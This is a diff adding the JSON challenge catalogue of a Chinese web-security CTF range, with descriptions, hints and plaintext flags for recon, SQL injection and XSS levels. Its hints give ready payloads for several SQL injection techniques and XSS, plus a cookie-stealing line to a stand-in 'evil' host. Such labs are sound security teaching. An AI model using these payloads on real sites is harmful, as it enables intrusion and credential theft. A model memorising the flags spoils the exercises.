@@ -1,0 +1,3402 @@
+{
+ "categories": {
+  "recon": {
+   "title": "信息收集",
+   "emoji": "🔍",
+   "desc": "攻破往往始于一次细心的观察：robots、备份文件与版本库泄露。"
+  },
+  "sql": {
+   "title": "SQL 注入",
+   "emoji": "🗄️",
+   "desc": "与数据库对话的艺术：联合、报错、盲注到堆叠，一步步读懂并操控 SQL。"
+  },
+  "xss": {
+   "title": "跨站脚本 XSS",
+   "emoji": "🎭",
+   "desc": "让别人的浏览器替你运行代码：反射、存储、DOM 三种形态逐一线索拆解。"
+  },
+  "upload": {
+   "title": "文件上传",
+   "emoji": "📤",
+   "desc": "一个上传框能捅出多大篓子：绕过校验、解析漏洞到 getshell 全链路。"
+  },
+  "lfi": {
+   "title": "文件包含 LFI",
+   "emoji": "📂",
+   "desc": "让服务器替你读文件：本地包含、路径穿越与协议封装的玩法。"
+  },
+  "rce": {
+   "title": "命令执行 RCE",
+   "emoji": "⚡",
+   "desc": "从拼接 system() 到回调函数，命令注入的每一层绕过都在这。"
+  },
+  "ssrf": {
+   "title": "SSRF 请求伪造",
+   "emoji": "🌐",
+   "desc": "让服务器替你发请求：内网探测、协议利用与重定向陷阱。"
+  },
+  "xxe": {
+   "title": "XXE 外部实体",
+   "emoji": "🎯",
+   "desc": "XML 解析器的暗面：外部实体、参数实体与带外数据外带。"
+  },
+  "ssti": {
+   "title": "模板注入 SSTI",
+   "emoji": "🧩",
+   "desc": "模板引擎的双面性：从 {{7*7}} 探测到引擎利用链。"
+  },
+  "unser": {
+   "title": "反序列化",
+   "emoji": "📦",
+   "desc": "对象睡去醒来时发生了什么：魔术方法链与 POP 利用。"
+  },
+  "nosql": {
+   "title": "NoSQL 注入",
+   "emoji": "🍃",
+   "desc": "不是只有 SQL 才会注入：文档查询操作符与 XPath 的陷阱。"
+  },
+  "auth": {
+   "title": "认证与会话",
+   "emoji": "🔑",
+   "desc": "登录这道门的缝隙：弱认证、会话固定与覆盖。"
+  },
+  "csrf": {
+   "title": "CSRF",
+   "emoji": "🎣",
+   "desc": "借你的手发请求：跨站请求伪造与对抗手段。"
+  },
+  "jwt": {
+   "title": "JWT 安全",
+   "emoji": "🔏",
+   "desc": "令牌不是免死金牌：算法混淆、弱密钥与签名绕过。"
+  },
+  "sess": {
+   "title": "会话劫持",
+   "emoji": "🍪",
+   "desc": "Cookie 里的身份：固定、窃取与可预测性。"
+  },
+  "cors": {
+   "title": "CORS 跨域",
+   "emoji": "🚧",
+   "desc": "同源策略的豁免清单怎么变成后门：跨域读取与攻击页演示。"
+  },
+  "redirect": {
+   "title": "重定向安全",
+   "emoji": "↪️",
+   "desc": "302 跳转的滥用：开放重定向、跳转绕过与钓鱼。"
+  },
+  "crlf": {
+   "title": "CRLF 注入",
+   "emoji": "📡",
+   "desc": "响应头里的换行符：伪造 Set-Cookie 到缓存投毒。"
+  },
+  "graphql": {
+   "title": "GraphQL 安全",
+   "emoji": "⚛️",
+   "desc": "自描述 API 的阴影：内省泄露与越权取数。"
+  },
+  "pp": {
+   "title": "原型链污染",
+   "emoji": "👾",
+   "desc": "JavaScript 的继承暗门：__proto__ 污染与深拷贝放大。"
+  },
+  "varcover": {
+   "title": "变量覆盖",
+   "emoji": "🎛️",
+   "desc": "谁把谁的变量盖掉了：$$、extract 与 parse_str 的经典翻车。"
+  },
+  "logic": {
+   "title": "业务逻辑",
+   "emoji": "🧠",
+   "desc": "代码没错但业务错了：越权、竞争与支付逻辑的坑。"
+  },
+  "weak": {
+   "title": "弱口令与弱凭据",
+   "emoji": "🗝️",
+   "desc": "从默认口令到可预测 token：凭据强度的连锁坍塌。"
+  },
+  "code": {
+   "title": "代码审计",
+   "emoji": "🔬",
+   "desc": "拿着源码找漏洞：危险函数、加密误用与回调陷阱。"
+  },
+  "read": {
+   "title": "敏感文件读取",
+   "emoji": "👁️",
+   "desc": "任意文件读取的花式玩法：配置、进程信息与路径技巧。"
+  },
+  "misc-web": {
+   "title": "Web 杂项",
+   "emoji": "🕹️",
+   "desc": "不好归类但考点经典：组合拳与边角知识。"
+  },
+  "adv": {
+   "title": "综合进阶",
+   "emoji": "🎓",
+   "desc": "真实攻击的组合艺术：多漏洞链、缓存与走私。"
+  }
+ },
+ "challenges": [
+  {
+   "id": "recon1",
+   "category": "recon",
+   "order": 1,
+   "title": "机器人不看的角落 · robots.txt",
+   "path": "/recon1",
+   "difficulty": 1,
+   "public": true,
+   "flag": "flag{recon1_6d92c4e7}",
+   "description_html": "信息收集从“爬虫看什么、不看什么”开始。<code>robots.txt</code> 是站点告诉搜索引擎“别收录这些路径”的约定——但对攻击者来说，这等于一张藏宝图。找到被 <code>Disallow</code> 的目录，进去看看。",
+   "hints": [
+    "robots.txt 位于站点根路径：<code>/robots.txt</code>。",
+    "被 Disallow 的目录对浏览器并没有任何访问限制——直接访问它。",
+    "进去之后是一张简单的页面，flag 就写在里面。"
+   ],
+   "knowledge": [
+    {
+     "name": "Google — robots.txt 规范",
+     "url": "https://developers.google.com/search/docs/crawlers-indexing/robots/intro"
+    },
+    {
+     "name": "维基百科 — robots.txt",
+     "url": "https://zh.wikipedia.org/wiki/Robots.txt"
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "recon2",
+   "category": "recon",
+   "order": 2,
+   "title": "打包的过去 · 备份文件",
+   "path": "/recon2",
+   "difficulty": 1,
+   "public": true,
+   "flag": "flag{recon2_f05a38b1}",
+   "description_html": "运维小哥上线前把整站打了个包放在 Web 根目录“临时存一下”，然后就忘了。备份文件名往往逃不开那几个：<code>www.zip / backup.zip / site.tar.gz / web.rar …</code>——用目录扫描工具（或浏览器手猜）把它找出来，解压看看里面躺着什么。",
+   "hints": [
+    "先访问 <code>/recon2/</code> 看看页面本身与 HTML 注释，确认“打包备份”的传言。",
+    "常见名字挨个试：<code>/www.zip</code>、<code>/backup.zip</code>、<code>/web.zip</code>… 也可以用 dirsearch + SecLists 字典。",
+    "下载后解压，重点看配置文件（如 config.php）——里面通常有不该留下的秘密。"
+   ],
+   "knowledge": [
+    {
+     "name": "dirsearch 目录扫描工具",
+     "url": "https://github.com/maurosoria/dirsearch"
+    },
+    {
+     "name": "SecLists 字典合集",
+     "url": "https://github.com/danielmiessler/SecLists"
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "recon3",
+   "category": "recon",
+   "order": 3,
+   "title": "时光机的痕迹 · .git 泄露",
+   "path": "/recon3",
+   "difficulty": 3,
+   "public": true,
+   "flag": "flag{recon3_1b7e94ca}",
+   "description_html": "新站上线，但开发者直接把整个代码目录（包括 <code>.git</code> 版本库）拷到了服务器上。通过泄露的 .git 可以还原<b>全部提交历史</b>——哪怕文件已经“删除”，历史对象里依然完好无损。工具有 GitHack / git-dumper，也可以手工按对象哈希逐个下载。",
+   "hints": [
+    "验证泄露：<code>curl http://TARGET/recon3/.git/HEAD</code>，能读到内容就实锤。",
+    "用 GitHack：<code>python GitHack.py http://TARGET/recon3/.git/</code>，还原出仓库副本。",
+    "在还原出的仓库里 <code>git log --all</code> 看历史：有一次提交的 message 提到删除了敏感文件。",
+    "<code>git show &lt;该提交的父提交&gt;</code> 或 <code>git checkout &lt;hash&gt; -- flag.txt</code> 把删掉的文件从历史里捞回来。"
+   ],
+   "knowledge": [
+    {
+     "name": "GitHack — .git 泄露利用工具",
+     "url": "https://github.com/lijiejie/GitHack"
+    },
+    {
+     "name": "git-dumper",
+     "url": "https://github.com/arthaud/git-dumper"
+    },
+    {
+     "name": "Pro Git 书（中文版）— 恢复对象与历史",
+     "url": "https://git-scm.com/book/zh/v2"
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "recon4",
+   "category": "recon",
+   "order": 4,
+   "title": ".svn 泄露",
+   "path": "/recon4",
+   "difficulty": 1,
+   "public": true,
+   "flag": "flag{recon4_e05acfca}",
+   "description_html": "用 <code svn checkout</code  部署网站后忘删 <code .svn</code ，攻击者就能“下载整份源码”。git 的 <code .git/</code  泄露是同一类问题。",
+   "hints": [
+    "首页和 README 都提到用 svn checkout 部署。SVN 1.6 的工作副本会在每个目录下留下 .svn/ 元数据目录，先访问 /.svn/entries 看看。",
+    "entries 是工作副本清单：文件名、内网仓库地址、提交人都列在里面。真正的大奖是 .svn/text-base/ 下每个受控文件的 .svn-base 原始版本缓存。",
+    "直接访问：\ncurl http://TARGET/recon4/.svn/entries\ncurl http://TARGET/recon4/.svn/text-base/config.php.svn-base\nflag 在缓存下来的旧版配置注释里（当年的『运维交接备注』）。"
+   ],
+   "knowledge": [
+    {
+     "name": "SVN 工作副本机制",
+     "url": ""
+    },
+    {
+     "name": ".svn/entries 与 text-base 缓存",
+     "url": ""
+    },
+    {
+     "name": "版本控制目录泄露",
+     "url": ""
+    },
+    {
+     "name": "dvcs-ripper",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "recon5",
+   "category": "recon",
+   "order": 5,
+   "title": ".DS_Store 泄露",
+   "path": "/recon5",
+   "difficulty": 1,
+   "public": true,
+   "flag": "flag{recon5_29e4c1f7}",
+   "description_html": "首页线索：assets 目录由 Mac 维护。直接猜路径：",
+   "hints": [
+    "首页说素材目录 assets/ 由 Mac 维护。macOS 的 Finder 会在目录里留一个 .DS_Store 二进制文件——先把它下载下来：curl http://TARGET/recon5/assets/.DS_Store -o .DS_Store",
+    ".DS_Store 是二进制，但文件名以 UTF-16BE 明文存于其中。用 strings -e b .DS_Store（或 python 解码 UTF-16BE）提取文件名清单。",
+    "提取结果里有个不属于页面上链接的文件：secret_5ec27afb2d19.txt —— 访问 http://TARGET/recon5/assets/secret_5ec27afb2d19.txt 即得 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "macOS .DS_Store",
+     "url": ""
+    },
+    {
+     "name": "UTF-16BE 文件名提取",
+     "url": ""
+    },
+    {
+     "name": "strings -e b",
+     "url": ""
+    },
+    {
+     "name": "隐藏文件名发现",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "recon6",
+   "category": "recon",
+   "order": 6,
+   "title": "vim 交换文件泄露",
+   "path": "/recon6",
+   "difficulty": 1,
+   "public": true,
+   "flag": "flag{recon6_407506c5}",
+   "description_html": "同一家族：<code .swo/.swn</code （多 vim 实例）、<code file~</code  备份、Emacs 的 <code #file#</code 、各种编辑器本地历史——\"编辑器中间产物 = 半个源码库\"。",
+   "hints": [
+    "首页说开发者用 vim 在服务器上改代码时 SSH 断线。vim 编辑 index.php 时的交换文件名是固定的：.index.php.swp —— 试试直接下载它。",
+    "swp 是二进制，但内容区是明文。strings .index.php.swp 就能看到编辑中的源码草稿（还有 vim 版本、原文件路径、用户名、主机名）。",
+    "curl http://TARGET/recon6/.index.php.swp -o d.swp\nstrings d.swp | grep flag\n草稿里的 TODO 注释写着『删掉下面的调试 flag 再发布』——他还没来得及删。"
+   ],
+   "knowledge": [
+    {
+     "name": "vim .swp 交换文件",
+     "url": ""
+    },
+    {
+     "name": "异常退出残留",
+     "url": ""
+    },
+    {
+     "name": "strings 提取 / vim -r 恢复",
+     "url": ""
+    },
+    {
+     "name": "编辑器中间产物",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "recon7",
+   "category": "recon",
+   "order": 7,
+   "title": "目录扫描与备份泄露",
+   "path": "/recon7",
+   "difficulty": 3,
+   "public": true,
+   "flag": "flag{recon7_12a5ae5b}",
+   "description_html": "1. <code /robots.txt</code  → <code Disallow: /manage 2024/</code （后台路径白送） 2. <code /manage 2024/index.php</code  的 HTML 注释 → 运维备忘\"备份别放 web 根目录 /backup 20240601.zip\" 3. 字典常见名 <code /www.zip</code （扫描器默认字典必含）→ 全站源码备份",
+   "hints": [
+    "先用浏览器看看 /recon7/robots.txt —— 爬虫协议经常『好心』地把后台路径写出来。再想想：运维打包源码时最常用什么文件名？（www.zip？backup+日期.zip？）",
+    "上目录扫描器：dirsearch -u http://TARGET/recon7/ -e php,zip,txt （或 gobuster）。你会扫出两个 zip 备份和后台目录 /manage_2024/，后台页面源码注释里还有一条『备份勿放 web 根目录』的运维备忘。",
+    "curl http://TARGET/recon7/www.zip -o www.zip && unzip www.zip\ncat inc/config.php\nflag 在备份配置文件的运维备注注释里。（backup_20240601.zip 同样命中）"
+   ],
+   "knowledge": [
+    {
+     "name": "目录扫描",
+     "url": ""
+    },
+    {
+     "name": "robots.txt 情报",
+     "url": ""
+    },
+    {
+     "name": "源码备份压缩包",
+     "url": ""
+    },
+    {
+     "name": "dirsearch/gobuster",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql1",
+   "category": "sql",
+   "order": 1,
+   "title": "登上数据库的第一层楼 · 联合注入",
+   "path": "/sql1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{sql1_5f3a91c2}",
+   "description_html": "一个根据 id 查询用户信息的小站。数字 id 直接拼进了 SQL——先用 <code>ORDER BY</code> 摸清列数，再用 <code>UNION SELECT</code> 让数据库把藏起来的 flag 表内容直接“回显”到页面上。",
+   "hints": [
+    "输入 <code>?id=1 and 1=1</code> 与 <code>?id=1 and 1=2</code> 对比结果，确认注入存在（数字型，无需引号）。",
+    "用 <code>?id=1 order by 3</code> / <code>order by 4</code> 测出列数：报错与成功的交界处就是列数。",
+    "页面回显的是第 2、3 列：<code>?id=-1 union select 1,2,3</code> 先看哪几列显示，再把 2 换成想查的内容。",
+    "flag 藏在同库的 <code>fl4g</code> 表里（字段名也叫 flag）：<code>?id=-1 union select 1,(select flag from fl4g limit 1),3</code>"
+   ],
+   "knowledge": [
+    {
+     "name": "PortSwigger — SQL 注入入门（EN）",
+     "url": "https://portswigger.net/web-security/sql-injection"
+    },
+    {
+     "name": "PortSwigger — UNION 注入攻击",
+     "url": "https://portswigger.net/web-security/sql-injection/union-attacks"
+    },
+    {
+     "name": "sqlmap 自动化工具",
+     "url": "https://github.com/sqlmapproject/sqlmap"
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql2",
+   "category": "sql",
+   "order": 2,
+   "title": "会说话的报错 · 报错注入",
+   "path": "/sql2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{sql2_8d47e0b6}",
+   "description_html": "这次页面只告诉你“用户存在/不存在”，数据不回显了。但开发者把 <b>MySQL 报错信息原样打印</b>了出来——让查询报错，并把想查的数据“夹带”进报错文本里带出来（<code>updatexml</code> 是经典载体）。输入是字符串型，记得闭合单引号。",
+   "hints": [
+    "先确认注入点：<code>?username=admin' and '1'='1</code> 与 <code>?username=admin' and '1'='2</code> 对比。",
+    "构造报错：<code>?username=admin' and updatexml(1,concat(0x7e,(select version()),0x7e),1)-- -</code>，报错里应出现版本号。",
+    "updatexml 第二个参数必须是合法 XPath，<code>concat(0x7e,...)</code> 里的 <code>~</code> 让它必然非法，从而把查询结果拼进报错。",
+    "flag 在 <code>fl4g</code> 表：<code>?username=admin' and updatexml(1,concat(0x7e,(select flag from fl4g limit 1),0x7e),1)-- -</code>"
+   ],
+   "knowledge": [
+    {
+     "name": "MySQL 报错注入函数参考（extractvalue/updatexml）",
+     "url": "https://portswigger.net/web-security/sql-injection/exploiting-error-based-injection"
+    },
+    {
+     "name": "MDN — SQL（基础语法）",
+     "url": "https://developer.mozilla.org/zh-CN/docs/Glossary/SQL"
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql3",
+   "category": "sql",
+   "order": 3,
+   "title": "无声的审判 · 布尔盲注",
+   "path": "/sql3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{sql3_b2c689f1}",
+   "description_html": "页面只剩两种状态：“查询成功/查询失败”。没有回显、没有报错——把每个判断变成一次 <b>是/否提问</b>，用 <code>ascii()+substr()</code> 二分逐字符猜出 flag。这题建议写脚本（writeup 里有参考实现）。",
+   "hints": [
+    "注入点仍是数字 id：<code>?id=1 and 1=1</code> 成功、<code>?id=1 and 1=2</code> 失败，说明表达式真假会反映在页面状态上。",
+    "猜长度：<code>?id=1 and (select length(flag) from fl4g limit 1)>20</code>，二分到准确值。",
+    "猜字符：<code>?id=1 and ascii(substr((select flag from fl4g limit 1),1,1))>110</code>，对每位做二分（ASCII 可打印范围 32~126）。",
+    "已知 flag 前缀是 <code>flag{sql_3_</code>，可以少猜 9 个字符；writeup 里有完整 Python 脚本。"
+   ],
+   "knowledge": [
+    {
+     "name": "PortSwigger — 盲注",
+     "url": "https://portswigger.net/web-security/sql-injection/blind"
+    },
+    {
+     "name": "PortSwigger — 条件响应盲注实验",
+     "url": "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses"
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql4",
+   "category": "sql",
+   "order": 4,
+   "title": "堆叠注入",
+   "path": "/sql4",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{sql4_14263169}",
+   "description_html": "本题特意让 回显只展示按 id 查到的商品行 （union 拿不到额外数据），逼你用堆叠 UPDATE 把别处的数据\"搬\"进可见的 <code goods</code  表。",
+   "hints": [
+    "先试试经典的布尔测试：id=1 and 1=1 与 id=1 and 1=0，观察回显行数变化 —— 确认注入点存在。但注意：结果区只按 id 回显，union 之类的招数在这里派不上用场。",
+    "本题执行 SQL 用的是 SQLite3::exec()，它会执行分号分隔的多条语句（对应 MySQL 里的 mysqli_multi_query）。既然查询结果看不见，能不能让数据库执行一条 UPDATE，把别处的数据搬到 goods 表里？",
+    "两步走：\n第一步 列出所有表名：/sql4/?id=1;UPDATE goods SET title=(SELECT group_concat(name) FROM sqlite_master WHERE type='table') WHERE id=1 然后访问 ?id=1\n第二步 拿 flag：/sql4/?id=1;UPDATE goods SET title=(SELECT flag FROM secret_flag_storage) WHERE id=1 再访问 ?id=1"
+   ],
+   "knowledge": [
+    {
+     "name": "堆叠注入",
+     "url": ""
+    },
+    {
+     "name": "SQLite 多语句执行 exec",
+     "url": ""
+    },
+    {
+     "name": "sqlite_master 系统表",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql5",
+   "category": "sql",
+   "order": 5,
+   "title": "时间盲注",
+   "path": "/sql5",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{sql5_159dae0d}",
+   "description_html": "curl -s -o /dev/null -w \"%{time total}\\n\" \\ 'http://TARGET/sql5/?card=1%20AND%20CASE%20WHEN%20(SELECT%20substr(flag,1,1)%20FROM%20flag secret)=%27z%27%20THEN%20randomblob(300000000)%20IS%20NOT%20NULL%20ELSE%200%20END'",
+   "hints": [
+    "页面对任何输入都返回同一句话 —— 但服务器处理不同输入的『耗时』可能不一样。用 curl -w '%{time_total}' 或者浏览器开发者工具的 Network 面板对比一下：card=1 和 card=1 and 1=1 谁慢？",
+    "SQLite 没有 sleep()，但 randomblob(N) 需要生成 N 个随机字节，N 很大时非常耗时。把它塞进 CASE WHEN 的『真』分支：card=1 AND CASE WHEN (SELECT substr(flag,1,1) FROM flag_secret)='f' THEN randomblob(300000000) IS NOT NULL ELSE 0 END —— 条件为真时响应会慢约 1 秒。这就是你的『1bit』信号。",
+    "逐个字符问太慢（每个字符最多试几十次），用二分：把 ='f' 换成 >'h'（SQLite 字符串按字节序比较），7 次就能定出一个字符。完整脚本见 writeup，判断位：card=1 AND CASE WHEN (SELECT substr(flag,2,1) FROM flag_secret)>'a' THEN randomblob(300000000) IS NOT NULL ELSE 0 END"
+   ],
+   "knowledge": [
+    {
+     "name": "时间盲注",
+     "url": ""
+    },
+    {
+     "name": "randomblob 延时",
+     "url": ""
+    },
+    {
+     "name": "CASE 惰性求值",
+     "url": ""
+    },
+    {
+     "name": "二分逐字符提取",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql6",
+   "category": "sql",
+   "order": 6,
+   "title": "宽字节注入",
+   "path": "/sql6",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{sql6_6d78d87f}",
+   "description_html": "攻击者输入：        %df'            (字节 0xdf 0x27) addslashes 转义后：  %df\\'           (字节 0xdf 0x5c 0x27) MySQL(GBK) 解析：    [0xdf 0x5c]  +  ' └─合法 GBK 汉字─┘  └─ 单引号逃逸！",
+   "hints": [
+    "addslashes 把 ' 变成 \\'（0x5c 0x27）。但如果反斜杠的前面能再凑出一个字节，让 [那个字节+0x5c] 在 GBK 里组成一个合法汉字呢？GBK 双字节字符的第二字节范围包含 0x5c。",
+    "在 URL 里输入 %df' ：%df 与转义产生的 0x5c 组成汉字（0xdf5c），单引号逃逸。先试布尔：?u=admin%df' or 1=1-- （注意 -- 后面要有一个空格）。",
+    "一步到位的 UNION（URL 编码直接复制）：\n/sql6/?u=-1%df%27%20union%20select%201%2Cflag%2C3%20from%20secret_vault--%20\nflag 出现在 username 列。"
+   ],
+   "knowledge": [
+    {
+     "name": "宽字节注入",
+     "url": ""
+    },
+    {
+     "name": "GBK 字符集与 0x5c",
+     "url": ""
+    },
+    {
+     "name": "addslashes 的字符集盲区",
+     "url": ""
+    },
+    {
+     "name": "mysqli_set_charset",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql7",
+   "category": "sql",
+   "order": 7,
+   "title": "二次注入",
+   "path": "/sql7",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{sql7_37ba4d81}",
+   "description_html": "<code '</code  闭合字符串，<code --</code  是 SQLite 的行注释（MySQL 里 <code #</code  也行，SQLite 只认 <code --</code  和 <code /   /</code ）。 注册/登录都走参数化，这个用户名只是普通字符串。",
+   "hints": [
+    "注册/登录都是参数化查询，直接注入没有出路。想想：还有什么地方会用到『你注册的用户名』？改密码时后端会用 session 里的 username 拼 UPDATE —— 注册一个带引号的用户名试试。",
+    "SQL 里的注释符：MySQL 里 # 和 -- 都行，SQLite 只认 -- （还有 /* */）。你想让 UPDATE 的 WHERE 变成 username='admin'，那么注册用户名应该是：admin'-- （引号闭合 + 注释吃掉尾巴）。",
+    "完整流程：\n1. 注册用户名 admin'-- ，密码 123456\n2. 用 admin'-- / 123456 登录\n3. 修改密码为 hacked888 —— 此时 UPDATE ... WHERE username='admin'--' 把 admin 的密码改成了 hacked888\n4. 用 admin / hacked888 登录，个人主页的『内部备忘』就是 flag"
+   ],
+   "knowledge": [
+    {
+     "name": "二次注入",
+     "url": ""
+    },
+    {
+     "name": "参数化只防一阶",
+     "url": ""
+    },
+    {
+     "name": "数据二次使用时的信任问题",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql8",
+   "category": "sql",
+   "order": 8,
+   "title": "ORDER BY 注入",
+   "path": "/sql8",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{sql8_9e497864}",
+   "description_html": "1.  ORDER BY 的参数不能预编译绑定 ——绑定参数会被当成常量而非列名，所以开发\"只能拼接\"，是注入高发区； 2. ORDER BY 之后 接不了 UNION （输出列已定死）； 3. 但 ORDER BY 后可以放 任意表达式 ，包括 <code CASE WHEN</code  和 标量子查询 ——于是排序结果本身就是一条 1bit 的布尔信道。",
+   "hints": [
+    "注入点在 ORDER BY 后面：这里不能 UNION，但可以放【表达式】。先试试 sort=id DESC 和 sort=price，再试试 sort=(CASE WHEN 1=2 THEN id ELSE title END) —— 首行变了吗？",
+    "flag 在 flag_secret.flag。把条件换成对 flag 的提问：sort=(CASE WHEN (SELECT substr(flag,1,1) FROM flag_secret)='f' THEN id ELSE title END) —— 首行是《Web安全入门指南》说明条件为真（按 id 排），首行是《CTF从零到一》说明为假（按 title 排）。这就是 1bit 信道。",
+    "等值比较太慢，用大于号二分（7 次定一个字符）：sort=(CASE WHEN (SELECT substr(flag,6,1) FROM flag_secret)>'m' THEN id ELSE title END) 完整自动脚本见 writeup。"
+   ],
+   "knowledge": [
+    {
+     "name": "ORDER BY 注入",
+     "url": ""
+    },
+    {
+     "name": "排序字段白名单缺失",
+     "url": ""
+    },
+    {
+     "name": "CASE WHEN 布尔盲注",
+     "url": ""
+    },
+    {
+     "name": "ORDER BY 不可参数化",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "sql9",
+   "category": "sql",
+   "order": 9,
+   "title": "过滤与绕过",
+   "path": "/sql9",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{sql9_98da9c42}",
+   "description_html": "1.  空格只删了字面空格 ——SQL 里起到\"空白分隔\"作用的不止空格：内联注释 <code / /</code 、换行 <code %0a</code 、Tab <code %09</code  都行； 2.  关键字用\"删除\"处理且只扫一遍 （<code str ireplace($black, '', $s)</code ）——删除后拼出来的新词不会被复查，于是 双写 可以重组关键字：",
+   "hints": [
+    "先随便输入 a' and 1=1-- 看看页面上『WAF 之后』那一栏 —— 空格、and、-- 都被删掉了。注意 WAF 的实现是『删掉危险词就完事』，删完并没有再检查一遍。",
+    "被删掉的关键字可以『双写』长回来：selselectect 删掉中间的 select 后剩下的仍是 select（str_ireplace 只扫一遍）。空格用 /**/ 代替（%0a 换行也行）。union 的结尾注意：原 SQL 是 LIKE '%...%'，最后那个 %' 要靠 or '1 之类闭合。",
+    "第一步查表名（URL 编码后直接用）：\n?q=x%27%2F**%2Funiunionon%2F**%2Fselselectect%2F**%2F1%2Cname%2C3%2F**%2Ffrfromom%2F**%2Fsqlite_master%2F**%2Fwhwhereere%2F**%2F1%2F**%2Foorr%2F**%2F%271\n第二步把 sqlite_master 换成 s3cret_vault、name 换成 flag，flag 就在第二列。"
+   ],
+   "knowledge": [
+    {
+     "name": "黑名单过滤绕过",
+     "url": ""
+    },
+    {
+     "name": "内联注释 /**/ 替代空格",
+     "url": ""
+    },
+    {
+     "name": "双写绕过 str_ireplace",
+     "url": ""
+    },
+    {
+     "name": "SQLite sqlite_master",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "xss1",
+   "category": "xss",
+   "order": 1,
+   "title": "镜子里的回声 · 反射型 XSS",
+   "path": "/xss1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{xss1_3e9d74a0}",
+   "description_html": "搜索页把你输入的关键词原样“反射”回页面。让一段 <b>&lt;script&gt;</b> 或事件处理器在页面里执行起来——右侧面板的 <b>Victim Bot</b> 会访问你的链接，若脚本执行成功就把它 Cookie 里的 flag 交给你（真实世界里这就是 Cookie 窃取）。",
+   "hints": [
+    "最朴素的验证：<code>?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>，看看关键词回显处发生了什么。",
+    "事件处理器同样算执行：<code>?q=&lt;img src=x onerror=alert(1)&gt;</code>。",
+    "<code>&lt;a href=\"javascript:alert(1)\"&gt;点我&lt;/a&gt;</code> 这类伪协议链接也是有效向量。",
+    "构造好后点面板里的 🤖 按钮，让虚拟 Victim 替你“踩”这个链接。"
+   ],
+   "knowledge": [
+    {
+     "name": "PortSwigger — XSS 专题",
+     "url": "https://portswigger.net/web-security/cross-site-scripting"
+    },
+    {
+     "name": "OWASP — XSS 类型与防御",
+     "url": "https://owasp.org/www-community/attacks/xss/"
+    },
+    {
+     "name": "PortSwigger — XSS Payload 速查表",
+     "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+    }
+   ],
+   "bot": true
+  },
+  {
+   "id": "xss2",
+   "category": "xss",
+   "order": 2,
+   "title": "留言板里的幽灵 · 存储型 XSS",
+   "path": "/xss2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{xss2_7c1f52b8}",
+   "description_html": "留言板把每个人发布的内容<b>永久存储</b>并无过滤地渲染给所有访客——你的 payload 将在每一位访客（包括 Victim）的浏览器里执行，而不只是你自己的。发一条带脚本的留言，然后让 Victim 来看一眼。",
+   "hints": [
+    "先发一条普通留言，观察内容是如何原样出现在列表里的（右键查看源码，注意没有任何转义）。",
+    "和反射型不同，这里不需要构造 URL，只需要“存”进去：<code>&lt;img src=x onerror=alert(1)&gt;</code>。",
+    "发完留言后点面板的 🤖 按钮：Victim 会浏览留言板，并执行你留言中的脚本。",
+    "思考：真实场景里该用 <code>window.location='https://evil/?c='+document.cookie</code> 把 Cookie 发走；靶场里 Bot 会直接把偷到的 Cookie 展示给你。"
+   ],
+   "knowledge": [
+    {
+     "name": "PortSwigger — 存储型 XSS",
+     "url": "https://portswigger.net/web-security/cross-site-scripting/stored"
+    },
+    {
+     "name": "HTML 转义为什么能防 XSS",
+     "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    }
+   ],
+   "bot": true
+  },
+  {
+   "id": "xss3",
+   "category": "xss",
+   "order": 3,
+   "title": "看不见的渲染 · DOM 型 XSS",
+   "path": "/xss3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{xss3_a84b06d3}",
+   "description_html": "服务端这次很干净：页面源码里根本没有你的输入。数据流完全发生在<b>浏览器里</b>——JS 从 <code>location.search</code> 取 <code>name</code> 参数，过滤掉 <code>&lt;script&gt;</code> 后塞进 <code>innerHTML</code>。搞清楚两件事：<b>过滤了什么、渲染到哪个 sink</b>，然后找出能穿过过滤又在 innerHTML 里活下来的 payload。",
+   "hints": [
+    "先用 <code>?name=hello</code> 看看页面如何问候你，再查看页面源码，找到 JS 里的 source（location.search）和 sink（innerHTML）。",
+    "页面把 <code>&lt;script…&gt;</code> 开标签删掉了；而且即使删掉过滤，<code>innerHTML</code> 插入的 <code>&lt;script&gt;</code> 也不会执行——这条路本来就不通。",
+    "事件属性不受影响：<code>?name=&lt;img src=x onerror=alert(1)&gt;</code>。",
+    "<code>&lt;svg onload=alert(1)&gt;</code> 同样可行——把 payload 放进 URL 后点 🤖 按钮。"
+   ],
+   "knowledge": [
+    {
+     "name": "OWASP — DOM 型 XSS",
+     "url": "https://owasp.org/www-community/attacks/xss/#dom-based-xss"
+    },
+    {
+     "name": "MDN — Element.innerHTML（为何 script 不执行）",
